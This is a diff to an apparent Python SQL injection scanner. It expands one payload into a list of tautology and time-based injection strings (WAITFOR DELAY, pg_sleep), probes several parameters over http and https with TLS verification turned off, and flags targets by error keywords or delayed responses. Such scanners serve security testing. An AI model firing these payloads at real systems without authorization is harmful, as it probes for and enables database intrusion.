@@ -1,19 +1,42 @@
 import requests
+import time
 
-SQLI_PAYLOAD = "' OR '1'='1"
+SQLI_PAYLOADS = [
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "' OR 1=1--",
+    "\" OR 1=1--",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "'; SELECT pg_sleep(5)--"
+]
 
 def scan_sqli(target):
-    url = f"http://{target}?id={SQLI_PAYLOAD}"
-    try:
-        res = requests.get(url, timeout=5)
-        if "sql" in res.text.lower() or "syntax" in res.text.lower():
-            return {
-                "vulnerable": True,
-                "payload": SQLI_PAYLOAD
-            }
-    except:
-        pass
-
+    results = []
+    for scheme in ["http", "https"]:
+        for param in ["id", "user", "uid"]:
+            for payload in SQLI_PAYLOADS:
+                url = f"{scheme}://{target}?{param}={payload}"
+                try:
+                    start = time.time()
+                    res = requests.get(url, timeout=7, verify=False)
+                    elapsed = time.time() - start
+                    # Error-based detection
+                    if any(x in res.text.lower() for x in ["sql", "syntax", "mysql", "you have an error", "warning"]):
+                        results.append({
+                            "url": url,
+                            "payload": payload,
+                            "type": "error-based"
+                        })
+                    # Time-based detection
+                    if elapsed > 5:
+                        results.append({
+                            "url": url,
+                            "payload": payload,
+                            "type": "time-based"
+                        })
+                except Exception:
+                    continue
     return {
-        "vulnerable": False
+        "vulnerable": bool(results),
+        "details": results
     }
